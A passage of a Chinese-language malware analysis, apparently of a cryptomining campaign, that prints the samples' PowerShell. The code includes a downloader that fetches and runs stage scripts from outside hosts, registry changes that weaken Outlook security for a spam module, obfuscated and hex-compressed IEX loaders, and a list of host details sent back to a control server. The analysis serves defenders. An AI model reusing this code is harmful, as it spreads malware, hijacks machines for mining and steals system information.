class="number">22035968</span>)&#123;</span><br><span class="line">(<span class="built_in">new-object</span> Net.WebClient).<span class="string">&quot;DownloadFile&quot;</span>(<span class="variable">$down_url</span>+<span class="string">&quot;/<span class="variable">$nd</span>&quot;</span>,<span class="string">&quot;<span class="variable">$env:tmp</span>\<span class="variable">$nd</span>&quot;</span>)</span><br><span class="line">(<span class="built_in">New-Object</span> <span class="literal">-ComObject</span> Shell.Application).NameSpace(<span class="variable">$env:tmp</span>).CopyHere(<span class="string">&quot;<span class="variable">$env:tmp</span>\<span class="variable">$nd</span>\*&quot;</span>,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">Remove-Item</span> <span class="variable">$env:tmp</span>\<span class="variable">$nd</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$hks</span>=<span class="string">&quot;HKEY_LOCAL_MACHINE\SOFTWARE\&quot;</span></span><br><span class="line"><span class="variable">$mso</span>=<span class="string">&quot;Microsoft\Office&quot;</span></span><br><span class="line"><span class="variable">$wnd</span>=<span class="string">&quot;Wow6432Node\&quot;</span></span><br><span class="line"><span class="variable">$crm</span>=<span class="string">&quot;ClickToRun\REGISTRYy3dMACHINE\Software\&quot;</span></span><br><span class="line"><span class="variable">$paths</span>=<span class="selector-tag">@</span>(<span class="string">&quot;<span class="variable">$hks</span><span class="variable">$mso</span>&quot;</span>,<span class="string">&quot;<span class="variable">$hks</span><span class="variable">$wnd</span><span class="variable">$mso</span>&quot;</span>,<span class="string">&quot;<span class="variable">$hks</span><span class="variable">$mso</span>\<span class="variable">$crm</span><span class="variable">$mso</span>&quot;</span>,<span class="string">&quot;<span class="variable">$hks</span><span class="variable">$mso</span>\<span class="variable">$crm</span><span class="variable">$wnd</span><span class="variable">$mso</span>&quot;</span>)</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$path</span> <span class="keyword">in</span> <span class="variable">$paths</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">test-path</span> Registry::<span class="variable">$path</span>)&#123;</span><br><span class="line"><span class="built_in">get-childitem</span> Registry::<span class="variable">$path</span> <span class="literal">-name</span>|<span class="built_in">where-object</span>&#123;<span class="variable">$_</span> <span class="operator">-match</span> <span class="string">&quot;\d+&quot;</span> <span class="operator">-and</span> (<span class="built_in">Test-Path</span> Registry::<span class="variable">$path</span>\<span class="variable">$_</span>\Outlook)&#125;|<span class="keyword">foreach</span>&#123;</span><br><span class="line">    <span class="variable">$skey</span>=<span class="string">&quot;Registry::<span class="variable">$path</span>\<span class="variable">$_</span>\Outlook\Security&quot;</span></span><br><span class="line"><span class="keyword">if</span>(!(<span class="built_in">Test-Path</span> <span class="variable">$skey</span>))&#123;</span><br><span class="line"><span class="built_in">New-Item</span> <span class="variable">$skey</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Set-ItemProperty</span> <span class="variable">$skey</span> ObjectModelGuard <span class="number">2</span> <span class="literal">-type</span> Dword</span><br><span class="line"><span class="variable">$mflag</span>=<span class="built_in">test-path</span> <span class="variable">$skey</span></span><br><span class="line">&#125;&#125;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$mflag</span>)&#123;</span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$localMail</span>=<span class="variable">$flase</span>;</span><br><span class="line">    <span class="built_in">New-Object</span> Threading.Mutex(<span class="variable">$true</span>,<span class="string">&#x27;Global\LocalMail&#x27;</span>,[<span class="type">ref</span>]<span class="variable">$localMail</span>)&#125;<span class="keyword">catch</span>&#123;&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$localMail</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="built_in">test-path</span> <span class="variable">$env:tmp</span>\godmali4.txt))&#123;</span><br><span class="line">SIEX <span class="string">&quot;<span class="variable">$down_url</span>/if_mail.bin&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="built_in">test-path</span> <span class="variable">$env:tmp</span>\kk4kk.log))&#123;</span><br><span class="line">SIEX <span class="string">&quot;<span class="variable">$down_url</span>/ode.bin&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="脚本主要功能-1"><a href="#脚本主要功能-1" class="headerlink" title="脚本主要功能"></a>脚本主要功能</h4><ul><li>尝试设置DNS为<code>8.8.8.8</code>和<code>9.9.9.9</code></li><li>下载文件 均为<code>powershell</code>脚本<ul><li>如果不存在<code>%temp%\kk4kk.log</code>则下载<code>http://d.ackng.com/ode.bin</code> </li><li>如果存在<code>Outlook</code>且不存在<code>%temp%\godmali4.txt</code>则下载<code>http://d.ackng.com/if_mail.bin</code> （邮件攻击模块）</li><li>下载<code>http://d.ackng.com/if.bin</code></li><li>下载<code>http://d.ackng.com/kr.bin</code></li><li>如果系统为64位则下载<code>http://d.ackng.com/m6g.bin</code></li><li>如果系统为64位且存在显卡则下载<code>http://d.ackng.com/m6g.bin</code></li><li>下载执行<code>http://t.amynx.com/report.jsp</code></li><li>如果存在显卡（N卡）并且系统为64位则下载<code>nvd.zip</code></li></ul></li><li>回传以下信息到<code>http://t.amynx.com</code>，格式为<ul><li>操作系统</li><li>系统位数（是否为64）</li><li>当前用户</li><li>域信息</li><li>磁盘格式信息</li><li>显卡信息</li><li>内存容量（格式化为G）</li><li>是否为管理权限</li><li>3个下载的文件MD5值</li><li>通过矿工程序提供的接口<code>hxxp://127.0.0.1:43669/1/summary</code>获取当前机器的总算力数据</li><li>机器启动时间</li></ul></li><li>每次下载时判断返回长度是否大于等于173，如果大于则解密前173个字符并做SHA1校验，如校验成功则执行下一阶段脚本</li></ul><h3 id="report-js-结束进程脚本"><a href="#report-js-结束进程脚本" class="headerlink" title="report.js 结束进程脚本"></a>report.js 结束进程脚本</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">I`EX <span class="variable">$</span>(<span class="built_in">New-Object</span> IO.StreamReader (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.Compression.DeflateStream (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.MemoryStream (,<span class="variable">$</span>(<span class="string">&#x27;edbd07601c499625262f6dca7b7f4af54ad7e074a10880601324d8904010ecc188cde692ec1d69472329ab2a81ca6556655d661640cced9dbcf7de7befbdf7de7befbdf7ba3b9d4e27f7dfff3f5c6664016cf6ce4adac99e2180aac81f3f7e7c1f3f227eb76f9f4ebefb53e96769fa519ade49efecefed7ebf3efef6c9f7461fffa287eb8fd3fce4b85ce5f576faf09ef9fc8b67edc7e9e9f4b87c79faea643b4d3fb5df4c5e2e3e765fdcf9f8374e7ee3e40e357ff7c5c79f7cfc8cfedf7ef27dfa77e71efdf3bd53fa6741fffff2dbcd8a7e4ce8ff2ff13737d9ff1efd73fac597f4efb75fd33fab097f97d2ffb7d2710ad43ef9f8ce3efd43f8d2bf754608d0cf11f5f6e4bbbf887ea35fd234a75f4e8e9fd300a6842886907d1b1f7d0fede897f2e1f32f182fc0c658b929fdb14dffa77119c868feecf57700162369a929fda4d6f42f60df1128bf44befd447ecce4078624f8d0bf45d3e4d30a6057e3df1f5fbffe02edf9bbefa4fa06fe2eb631d6c612ce412100b6997e2300b757f8d936bfd8a20940f3690624d1022dcf0508be213afd922f2cb6e5170e55d3e943e9413b7a4eff7c6b7fb293fb4d3eb1bf4db2878026f0f72d60feead37def05ee67f290fe39c704665fd8a13cfcd435f33b41d38307bb963cfc23c3cb073bf4cf7dc0dac19fe7dfa27f4a462100d23e7cce1f2a7a0a33f586fcaccddf16a521e672dbfb5a7ee4cbc242d3379ecf96d922201178b4026b8c7fff67605b704c3a0340c70bf462b69d96dea89f7f6b594cc6989eb7df12e44d0ff4efc3e76084fc2dfd53e877962ea5a0f9b1a3cac732b2dc60653e5be275c6776146c56f55f4afe0ebf0f1185dc12936406406485980050d0613f03c7f67bb7dd68e3110331850977e9d37f44f1d52f58afea92046248ae92fca7940b92180e96191bd1069a1ffbffece2fc68b53e6c23eabfc34fd33f9723baff339fdf6dd27f8e717b1d0d58ac94bfae8f7dfbb877104c328becb126751c6670d64a704819c40318af8729a4b671fcbcc2cbebb1da119feca3fb7b3bfb545ff4bb7ee7cfcf18ba2facef6f7efef8df6e97fdf9be6abe68b2fa78f2e97f9ef966ea5bf10eaf830254db7b575795c9f654fca3cfdf85b8b59fdad8fef8c5f648bfc7bf746bbbba3bdef6f7fa73a7bf1f1c777e8a5efbd7e5317cbcfbfffe8d177be3c5b6e7dfc713adafafc2c4d7f92001c4f9e9f3e12559fde195f66cfbfcabf976eefa6e371ba4df86c68362ef3e5e76fbe7d27fd3e5987f4374efe1f&#x27;</span><span class="operator">-split</span><span class="string">&#x27;(..)&#x27;</span>|?&#123;<span class="variable">$_</span>&#125;|%&#123;[<span class="type">convert</span>]::ToUInt32(<span class="variable">$_</span>,<span class="number">16</span>)&#125;))), [<span class="type">IO.Compression.CompressionMode</span>]::Decompress)), [<span class="type">Text.Encoding</span>]::ASCII)).ReadToEnd();</span><br></pre></td></tr></table></figure><p>解密去混淆后如下</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">&amp; ( <span class="variable">$env:cOMspec</span>[<span class="number">4</span>,<span class="number">24</span>,<span class="number">25</span>]<span class="operator">-JoiN</span><span class="string">&#x27;&#x27;</span>)(((<span class="string">&#x27;((&#x27;</span><span class="built_in">Get-WmiObject</span> <span class="literal">-Class</span> Win32_Process|<span class="built_in">Where-Object</span>&#123;JSF_.Name <span class="operator">-eq</span> powershell.exe <span class="operator">-and</span> <span class="string">&#x27;+$_.CommandLine -like *kr.bin* -and JSF_.CommandLine -notlike *f4095084ad178f69a4f9b46b49abe0b4*&#125;|foreach&#123;stop-process -id JSF_.processid&#125;&#x27;</span>)<span class="operator">-crepLACe</span> <span class="variable">$</span><span class="string">&#x27;,[CHar]36 -crepLACe  &#x27;</span><span class="string">&#x27;,[CHar]39  -crepLACe  &#x27;</span>|<span class="string">&#x27;,[CHar]124)| . ( $pSHOME[4]+mPbpsHOmE[30]+&#x27;</span>x<span class="string">&#x27;)&#x27;</span>) <span class="operator">-CREPlAcE</span><span class="string">&#x27;$&#x27;</span>,<span class="variable">$</span>  <span class="operator">-CREPlAcE</span> <span class="string">&#x27;&#x27;</span><span class="string">&#x27;,&#x27;</span> <span class="operator">-replACe</span> <span class="string">&#x27;|&#x27;</span>,|) )  </span><br></pre></td></tr></table></figure><p>该脚本干的事只有检测当前<code>powershell</code>进程中是否含有<code>kr.bin</code>进程字样并且值为<code>f4095084ad178f69a4f9b46b49abe0b4</code>，有则结束进程</p><h3 id="if-mail-bin-垃圾邮件攻击模块"><a href="#if-mail-bin-垃圾邮件攻击模块" class="headerlink" title="if_mail.bin 垃圾邮件攻击模块"></a>if_mail.bin 垃圾邮件攻击模块</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>(<span class="built_in">New-Object</span> IO.StreamReader (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.Compression.DeflateStream (<span class="variable">$</span>(<span class="built_in">New-Object</span> IO.MemoryStream (,<span class="variable">$</span>(<span class="string">&#x27;edbd07601c499625262f6dca7b7f4af54ad7e074a10880601324d8904010ecc188cde692ec1d69472329ab2a81ca6556655d661640cced9dbcf7de7befbdf7de7befbdf7ba3b9d4e27f7dfff3f5c6664016cf6ce4adac99e2180aac81f3f7e7c1f3f225e5fa65b1f7df9d1271f7d7b39fbe84eba95a61fa577ee7cfaf0fbafb2f9f47ba33b0f3f95df3ed97da0bf3cdcd995dfb6f269f6fc65feea647b7f4f3f1a7dfced57dff9384ded3769fae93d03ead35d6de5407cf2503bda4a4f4fb2f2655e6fa70fed0b0f4c97f7ed9b7bfa91d73ebdf3f16f9cfcc60961fd45f3edd3cf17f42fa1cd6f7cfbe47b9f1c7caabff000e897adadd3e931b01bdf61dce8a3ef7fbe2c5eb5cdf746f4eed3f3effc34fd708df6bb8dee7c6a401ed85e760ff4973df3cbc1c35e770496c8c3f87d6a9a19ac1c9e9f5aa07bf77b201e46305ede7ff6e60701ca7bdab743f981edc674bcafc03ff974c7f477dffc16e20ceaca7ff9b4aeceb7d3bc2cced37c75dd6ea7edbb76bc5f94d962565d7cf17b7ffad3c56ad13eba5ce6a062bac8db62fb2a5fe2d55fc2efcfaae9ef5f16d982bf7e777af5f4f3b31fc317bf386fca9c9b3cb9fc895793f178dc16eff274b6ccd27c593de50fb9e19dad769a2f97d5c9f8ce1dfef441f18bd6f9f5b7bfcd9de7ab62c5bf8cf95ffe875b6d2db2bc6e5fb7cbbc284fa8d5cb59bec85e8c1bfc3afef26c4c9836d7af5382fdd3930a286f696f7953ad9ae2e9189081f4a1fbe8aa910f82416de5cbe2390dbbfeaefb5e5fddaaf973c124dae967e6153b48d7edcfd660d1efc79f7cfc99e949c67d676b51d46fc6b3c5b46972466a6bb63899e6ef4e67cbe3665915f4f1ebc57a79fae8d1f7f9cf65debe3ba50fa755fd72dc9445fbd5f71812f3e69d2d6aa243aaab676d917d97a68fbfe27f6e9c43d75427b2ce2febfcf5ad26f2f00e8d824720fce6cd6064526b3303b3e569f566969108c8479f2994603ef1fda6f9b4d0fae3777dff70e86027389d6ea76599cf9b3abfaa560cec336f9e451c55b8eaaacdeab62996c56276cc9fa4dfcfcbead5f2ac2d8bf593e6aa9a2d8bef8ecb6c554c9705cdfc3571f87a9abf26dbc0cd9a339ae82d12bbba5e9fb4f9e7c42ed484fe9e9d6d78f9fbf6b34d3d6c9d17ccab65bdfefd97d40ed88f18c9e7afbefafd5f7cf74b511bb052e52aafc7dc30afab69d8f0f4d5972761c3df93896295167f69b5103e59153ff8fddb36733a2ebfac16798daf9a9f1efa665acd86bee26eeea5f90f8a06aaf5f7f7e1d3b42e830fa06966cbbcf9fdcb7cc69375ffebbeb88f17bfce8b77ee7f72ff77bfb3a0a9c9eaed36bfd8da4a57795e36fca551e0d3e9ba21fecbdaa5503cad5a86444a3d7f2dbcd436d57c1b4af14ab52dbe1a1b551a40e3372f96857d59dee05f09d771be2059acf9cfd12efde7e1bf359b1d8f1be2b9c59cb0698fc30e04044d4e0f8437619b415ccfaa89b36a9fa5f4f793b085c8e1baf15bf147a479d79d11dff16866fb2d88fd491599869f81813cf0e99d9d2dfae82c6f690427e3b2e24601d85f7ca7f1276359f873b345c322c938b7ccf84bf89d45559ffffe97d3bc66709ff8007e4c81064dd26659708bb65a6ea77e7392558345f806e1117c308049d5fefe448566180fafc1adb0f0dbc3fe15a9f7898f04f93f9fd0ff3ffd1ab282d7bfbffbbdefbfcb4987fdfe242b68f1bda6acaa956584cf02e6e137766e78a3cb4b7869de5e2cf3721cb60c44f4b300a630da725d4dc7e1847cc2fcffd9bde92fe45f3ed1361e71b4c55ea78547666db13bfd8575deac05e9f52f04569fc169fc3d9655f3d3e3b6ae48d7de0d55350938999b59569550e8e33becaf4d27f9d5b8cd97ce98bdd802fe76d4777c616ff2f67a5296196499ac0d666c5c15dffb2c367d80e14fdeaaf8a96d92b89ffcfc69bbef29f2bae0a9143bd09970e7627ee279be9f753a89a9a9cfbaa0644c6487ebd92c5bb58b667c6717525d4003108da7d9581cafc608b8252f4fe79d4fe19194e45f94ebec3c7f4ae6565f78ad2f6cb9b9fefd8927e4adfb37bfa5b3efded9d9bdf9256508f3123ca06c5a94ab55367e5b5565bbae48f22940a45925b7eca7275f6e5fd1cffcc56702c02980941efcb2b3733f6d6604326f8ab22c16db6274b6db3a6b5fa7dec338c21d2acbf5b331269d31caebfcdbd72b38d517d9db69f69248cfd3db7933fdc5f6b73bed7ab52c444714a905a4da4155afeb6f89160a15cec4ea35fb646ee4c7ec7731bccfd23e165d32716b22d29489a47e1cbd1905a8ef335296641488376576ae3d5e97cb2fe1b1c229b3e86af7c4e35b01fdee1ceca6df4a9953efec7cbfe6981b2d4550d34fd24fe543faedbefd8dbffcbd5e6a9b6e1fc443e00852478ddf95a5f79d3b3d2acedb6cb5dd924c6fa5d0e6a4c04de33ec9bf2fdae37be41ad7d9ca42172167c166ca4d97ebae75f9253f667ef0cfb734bd931fd33f8c0322326efa7c36664740548ee8bb47f2493a6f8b2b7174f2362f73d16cbeaba38029e6e0efe1aa338f992f7eb1908149f68bf26d43c6a04b5832d3daf74b0c2cf0abd7dc70ac74cc2d54b3f0bf248bbfbf481d71894347c06f6ff39f8724f53b7bdbac895a0690b617dba9c042a0be4d4e88f7d1a16bf9997c6244c6989db0e7cf5c7bc1f2222b45dc6ed0349f39188ab17973049d2fbf283db77cf36cb881ac7f9721eec02a5b628ed4e2da0fb646e4845853fba8cc265579812f7edc3292cf4ff9bacc2ec762073f31cad47bcb4dbcd7b2e3c5f4df722cf063c431d51b875d93cfa76db618bfcb2f3c2fabcf0870c672300153f8dcb0001a1b50beaa63469eb0c1fb25fba3bd5ffcfd9fda3efe9e04a79f7c7f7bfc707b071ffc9ef4fb27bffbef6ffe94f6778adf638b5fff3ee3f43d62338b9c92caa3db1dc147c612582cc7f3ae09f0f55ee88c7097f42ca94f6139af997a82fa5187049f792dc30eb54160126fd02a62d08fc129a70404118e212f71831d5ec80fdae9f0ab1df688816106890b7c67c6370bfdfd6f5ae83bc4ee087e9fd6010bdc8edabb4c339fd0ea8e6c2073e79d781811a3ef7bcad130af7b2ed30f8dd36fe4740fa980f62ccfb3d9f6175f6c5fd3a3662e5b50828b6c16191eb2f39f7f46bfcc7e7f4afe7060c003e67fb8755ba4cb7c559174de7fa6611665b7b2695aa4a359beccdf56f5246dc4f192b09cfffd3d08c1ba4aeb75758d6f9b62fe461c0e401e59d070b419b4c21c49d67adea6efe867d592da27d39aaec8834a018a1a799d706341a1077c3e5d532e83a697fccfb7e928bf9ea4b38ad2df32040f08257cc9c423db7695d7d9f96d01f968f81ff9affe1e40995d8d8b65555f11b362a044fff9d5ef8a8762bd8590e89c084cbe367e25243cd86fd753a107bdf4dd5e071ba1c47b47e71efc676ffa50d919ceeb6953cc38b9cf0c954917241f7011176b4abca4b35cdda93c6ff0fe38afd7edfa3cad33728191bc68e99f665d1575764903406ae8b2a86b6a3f217a1362c421b35c3eba2e092ca98f34bfcce6699951fc59e7ab747951a04b0a0be657d4a6cc28c5b26af27459e75362780c99e22b621d62b2d75fbd3afbc9f4f8c597942cc417ec228220443f6fc87eb347bfcfab2f5f9ffde4d3e3f4db6f9e1f7ffb9b23c5c3dded5971599d702b8e0516d53948b2cc10542f8af49ad2c21e565f7efbbb29b79021be4ee9e5654a609e9efde4979afbf410a3d0a2ce17c7182639de88ad66a4c6965f71a2863ea28084c9b506bacdba2e7ed2ebcb40c5dbf3765dbf210a79e2b9f57b7e16759c58299044e2fb982de3eff165df0fb25ff53534be92b4a2c9e5dfb9737676f2fa981203c82556d3e5e9b87d97bff95e3abac366604583cb9f226f30abbe103f139f9da8cf29bf7f79c6ed7505e3e9c1f9f5e73f78b9bc6cbfd8fde4c1ddbd9fbabfb8fbeabb6f57f5ab373ff8c9fde9bd83eae0f9273bedfa275ffee0e0fe5efb60ef7af99dbd5f74ffcd4fcd1f7c727577e7d3e7f5cbe5ddbb0feedfcb761f7c77d9bc3b78f0e50f660f7ff0e0fe64ef07e7f7bffabd0f5e7eb2aa7fe2cdc37bf5e4e4f2a7db4f96cddd073fd82daac9bdf3bb3ff8e2f779fbe0f5cbecfeef7df9d32ff73e3d7851fed44ffee0a77fd1dde7d7dfbdffa6fe74b278d8fc5e07e77bd307eb375f7e72f0e0dbe7cfbeca8bddd5dbe7b34fdfd50f1fbcbd3b9b7cfee979f68387fbef7efac10fee365f3ddc7df0c9e43bbf68b15efde0177db7f9452fefefffdecbf6db0f7f7aefa79feedf7bf972f6d5e7f5ec273f6967cbe9e5fdbb97bfcf0ff2fdc5e70f5efcc4dddd1f2cbf7cf09d1f3ca85f9edfffe4a7eb97e5ec61fdba3ea89bf5b77fe2e1570fca87bb931f7c79f9e9fe83d76f67bfe8e1e5cbdfa7fcc1e57571f9b27db05f93c978f183fc41bed7bc7c70fd7b7ff7eec1a7cf7f9f17f71fbc3cbfbe7bffe10fde2ddffdd4fae0934ff6df5c9f3fbcf76ef98b3eb97ff27bbfbc3ffbe4f2f2f79e962fefdf6dda8387f9c3bbbff7dd83ebb7f7effedeedf54f4e7fd1fde5d3df67bfbefc89870fd7f7967767f77697cbbdb7f9ddcb072f1eec9c669fccdafcf88b4f7feadbe7bfe8f9ef75f7a71e7c7bffeac1b75fddbdbbfb74b95c3fbc7ef2f0c10fdeac3ff98907efdefcdecd7472ff0b8a68efffe4dddffb27f2dd8bcb4feeff5e0f3f5d7ef1e060f7c5f2f8fe270f3e7970fec957bb0f660f8be6e5f9831fd4cfcf3f39f8a9ddfc61fbf0b2b93b9f7cf2257db7b7ae3f79b1be9c7cf27b5f4e279ffee4f9f9fae1c14f9f177bcfbf7bffed4f5f5efe6072f6f0d34f1ede2dde2e2e0f0e28d175f7e12fba7c7d75f9f4e1779adffb72377b4844cd3fad97b3673f7898ffe43a3fbf7c70f7e54f9f1d7cf274f1f0f3657eefcd27f4fce4771feedd7f767049c0ef5e3cb8f783ef5e1fdc7d792f7f78f0f4cdbdcbfcc18307dfb9febdefe6e777f7ea4f76279f5ceddf7bf3fcf95d5abffee4f7fef2bbfb4f4ebffc4597e73f38fffcf207e73f79f7f4b2bcb77cf0f0aedab397bff7fe93af669fccead5cef977bffae41e71d2fd870f9f7cf7bcb8bf577f7bbef3fb5cbfb9dc39dffbe9cb873fc88a4f2f5f9e2f7ef2e5ddbd9ddf7bfd8b7ed1ddfc171d5cde5d3e7c39bd3af8c9df9b507bf0faf83bf73ec92fef7df2f9f9f2d3bb0707af2e1ffef483e7cbd9c9c3bbf756f9279f34cf2f2fefadde5c7e726fb57e7939dddf7dfaf2f29367f7cf3fb9577f7afd66f1e0f7beffc9f4f77e787f7259dc5dcd9ebcb9bb3e9f5edefdc9fceecbdfe70777270f9e97f75e5e363ff57cfde017ad1fdefdc1eac9735a855f7cf283874be2f5f9dde5e4f5c3bb7976f7e9bd17d377cfce7fd183fdbbf70feadf7bfd83073ff841fd8387ebbb7b3fb87cf98698e93bcbbbe7d377f58397af5edc9dde2f7fefbb9f3e7df6ddfdebef1c2cbfbc7bfde90101a1266f1f2eefde2feae2cbc9bdebdf7b76b5a8cfcf6735cdf1f9fd670f1f34f76866cf774ebed33eb8fce43bbff7f964ff17fde0727dbede7ffae04be2d7d9bb87bf68fef2653efbbd7fd127cdeff3f0eef40717edd3cbfceefd4f7ed1a7d5b72fcf1f5edc7b7879efe06e76efe97272efc1f2417b37df6d2f973f917f7af0fc17dd3d9fbd2b7f9fc5f28b8377bbdfbe7779f7fecbf27cf7ab875f1dac7ffafccbf3f39ff8a9f6c14f9edf6d5eec7f72f7ddec17ed3d581e1cbcfbbd67f577da9fbcf7530feb87ed626ff67b3d5c5ddebdf7fce5fd8bafeebefcf6f9cef3bbf77eafe50fee2f9b83873ffde6a23c78b8735d2fce2f69b86f5eb6773f59ad2ef7ee5ecfeaefe6d76fce7fd0fce4f9eef2e5e5834f5fbe7870b0b7bcfbe5c383dde7e7f99bb7e5b387e77b97fb0f3ff9453f783e7f43d37970ba7bfec99b07f92fbab7fce4e14f7cfa83dfbbb9b7ffd32feffee0e5dd27bff7c1010df86e7effee7271befe74effef9c14f3efcbd0ff6dffddeaf567b0b426af2f0c1ef5ddefd45f7ceefcf7ff0dd2f76a7075ffde0c1c3d5f9cbdd9ffae4d3d9e7d9ddecfacd9bc9f9dd83fdfb4f7fef7c72fd9dfaee6c77d57e9537fb073f78fd60fefa93fbdf797e7effc583d9f9fae0e09383376fbebc7ffd837bdf7ed9dca3aeee7ff2e6abf39f7af27b5ffee4f493dd77cb3cdb7b70f7e1f52b62c28224f8938383dd6fffc4f9270f0fbe7af766e7fc7cf761be7bfff7befb60bd3cfffcabf5bdef90b2bbfb70a72c7776efbe5c5e7c7279efc5dd9f7cb8bebc3c7ff1e6a75e5cfef4a7572fef3e7876f793d9c127f7dfbea83fd979d03ef8453b3f20a6fec12707973fb877f1f0eefaee973f7d77ddfcf4f50f966df68bee2edfcc1eb63fb8bc6c26d7f77f507ffbf2e5c3d9f3cb0707ab7b341f6fbe7d70f0f0fec17aeff75a9e1ffca22f1ffca26f57d7cbd9f5cebdbbcf0ececfcf771e9e7f79f0e997bff779fef093faf73abffb5377ef9f13763ff8bd7fd1a23978b6fef4e2ee2509f3c3b7777fef7b2fdf3cbbfbfbbc2af72614485eefdebbf7203f78f1fce1779ffdd479f6e9f3efbe7d46aaa37df8f2e1fe0f5ebe5bad7feafc935ff413cb575f7efbf2de77962463f7ebf5837279f7273fb9bafc76b3ffee075fb42f0f1e3e7cb8fbe5c54ef1e041fdf072eff9fd4feadde50fd62feffe44f39d7bf73e79f57b5d1ebcfec99fba7e783925392f3e79f96052fc74f5267f77fded9fd85b7efbf7b9bcae4f4e1e9ebffa7df2e7e5effd839f7cf049f110703e39b87ef2dde99377777ff0a4addfbdfee4d3c5a7df799e5f5f9fcfdfe6fbc5b72f9b1fb40fbf3bfd41f3a0bdff8bee7e72ffab7b97bf37f14f3b6bef3dfce4bbbb6f9793bd5ff4edabf3bd83cbe96559dfcd5efcf4de836f5f5d92cccd0f3ef9e97be7539289072fdb039aeedd6f379f3eff89377bc76fc9329cbf3df8f2c1a73ffd7bbf9cdebdfcbdbf7cb877f0f2a7eebef9f2fc8acc5cb3dffef49707cfeffee06eb6f783faec07e72f3fb9faa9f5e2e0e5839da7c4e46433d79ffcd462f5ecbbafdeed2ec908dcfbbdcbf3bbbfe8e1bdef5cdcbb7cb037bbfb6ceff2ee97b3bb0f97bbf9efbdfee493f58c3efbcef5dddffbf2d3bb0fbef38beede7bf8e0d39fbcfbb2bcfbe2d977af08d6c1eae9a7b34fee9fffdeeddda6be5eddffc1eca79e9f3ff8bdd7f927bff7e79f7c727eb9ff8b7eef87eb1fbc3cbf2abf7d402ae7e1c3eb9c88fae9f2eee9d5f21e999f4ff3d9a777cf0f767e8a08f2d50f16b39ffaa9dd9d66f7f4277ed1775eee3e28de5057f75ecc76bffdfbacef9d918efcbd7ef0e0f73effb27cf87b3f7c306b5f5ee69f7c9aff20bf7bfcfcfcde8397f7777eefaf76762fbffb7095bdfb64f27bbf9efddef9e5eccbdfe7fafacdb7ef9eef3dbcfbf0e5bd62fdd39f5ce63fb84be2fc83aff6f2bd7bb3cb83e6c5f9f5939f5efe3e3ff153bbed279fdc9fcc7e11e9ef9fae0fde7cfbec938b4f1e2c97b34f1e3e59ee1f90919cccee928dab27f77ff0f2d9170f49b1be5b7d7a39fd2a7fb8fac9970f9e9359fde4f7feee27ed2f5abc7e4ae2d534efee92cff0edfceeeff3eef9effdd5f493c5ef736ff632bffb9dcbd90f7ed1c1effdc927f7caecee27bfcfcbdfeb72fde07a71f7179d37bfd797cf76abfb7b5f65edf33559ea870f7ff064f9f0d3fbe5736a7b7672b9f77bdf7df9930fcb7b64fa7ff0e26e49927ff283731ad0c5ef7df7fc3cbf5fbcbd3c7f79fa66458a78fd7b377be7e73f38c8df913d797bfd83ecf7bebbdf7ef7de247ff88b7ef2e1eedd35a9ceefdc7dba4baef6efbdbe777e70f06056debbfcf4deb3e927f5ef7df7fe0fce1f166f3eff7232270d7ffef2e1fd9f6c7eef83773ff97be79feeffde97ebbb9f7ee741b53edfbbbff3f4727a953f98963f597fe7e46e75f7c1937beda7df591e143f75fef0076fee37d337072f7eeae10f26e5ef7d3efbf42767770f2ebf3d7df08b96d3d50fd67bf77fefdffbfc6ebdac3eb9aeefffe0abcb070d744db1fceec39d83079f7c427ed7f31fbc7cf570fffe0f7eef6f37abe7e7b3bd65fe3cbbbab87cb9debffac1b7ef4d3e99dc7b71be7f70f9f2deec2757d9a7f5cef9f58bbb0f4e49b68821debc9cedafbff37bbfb8fb9054c60f96649a7e40bd4d5fdd5fde9bdcfbc1d3fafc8b07e5770fbe7cf89377f3ab834f2ff7576fef7eb2f326bbff747779f0c9f4073f758f1c8d9f7afa7b3ffce45ef37b3d7cf0e00d89e0c3df7bf969fec9cec3dd4f9fbe7e71f7fce14ffde0eec1de93b7f75eaed63ffdf2f2f2ee273f987ef2c97271705596f7da1f3c7bf9fb5c372fefbe396f7f6f12ce2feeef3cb8bb5c3edcf9459ffedef9bbc5e5fedefa9387cf2ec9e9b9f7eae962f17bbd3c3f7ff8e99ae8f793cb83ecd543fa78d62cc911f8eadd8bf3fba7bbe4a95f7e37ffbd6916f73e395b91ee78fef0feb7df9273fcd5c3f9dbbde70fd73f755dfe20dff96476ef3b3bbff7c3fda78bcbbb070f9feded7fb2aa3eb95bfe8074faeaeef3c5dd4f2feacbd7f3dffbfcc14efdf2a7dfdcdfb97e70efdebdf35f7470ffee777faf970fafbeba7ff7de9b9ffabddf3d78f9f0f5b2be3e7f77fec9f2f9f9ddeb67a7bfd7dd2f66bff7ecee83d583f9c377bb6f7ef2f2a71eec2c0f7ed1f397b38777bf7def9c120f2febcf7ffafce1fdd9b729202a7fefe3bbd32f76df3ef874f1c9a72fbff3ecfce0cb1fdcbbfef6e54fecfede2fcf673ff980d4e46a75f7eebde9275fdd27dd90ffa2efdcfde4dea79397e73ff8e9bbcbd5773fc9ef3e3c25aff8dbe79ffc44fb60f73c3f3f7ff79d07f9ee4fad96772932c93e21af9554e2b37b07cde55d128ffb6fbe7cfe93afeefee0cb1d9aa5dfbbcaefed91365b1d343ff5f2d5fcf75e1edc3dfff4c58b779f3c58df7bf9b0a9bfb84f5e6ebefb76f7f7def9ce83b3f5f9cbbb07ed0b327ce7ed8b87bbf7be2c27ef7e7a5d10191e7ea9a